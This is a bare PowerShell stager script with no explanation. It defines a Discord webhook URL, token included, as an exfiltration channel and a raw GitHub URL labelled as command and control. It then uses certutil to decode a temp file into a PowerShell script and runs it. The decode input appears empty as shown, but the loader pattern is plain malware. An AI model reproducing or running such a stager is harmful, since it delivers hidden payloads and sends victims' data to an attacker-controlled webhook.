$webhook = "https://discord.com/api/webhooks/1143475003078213713/8jwYhEmOBDXLX1R9A_DvJ12ce8T6-nLe0z21AzflKdnxcbaRzGiNnSEzHDpdi_IJDQLl";$ccontrol = "https://raw.githubusercontent.com/Mr-Proxy-source/k/main/FkjjE39sk1k";$TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo  > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
